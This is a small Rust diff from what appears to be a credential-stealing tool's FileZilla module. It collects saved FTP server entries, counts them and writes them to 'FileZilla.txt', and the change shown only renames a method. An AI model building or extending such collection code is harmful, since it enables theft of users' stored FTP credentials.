@@ -46,7 +46,7 @@ impl<C: Collector> Task<C> for FileZillaTask {
             )
         }).collect();
 
-        collector.software().increase_ftp_hosts_by(servers.len());
+        collector.get_software().increase_ftp_hosts_by(servers.len());
 
         let servers = servers.join("\n\n");
         let _ = servers.write_to(parent / s!("FileZilla.txt"));
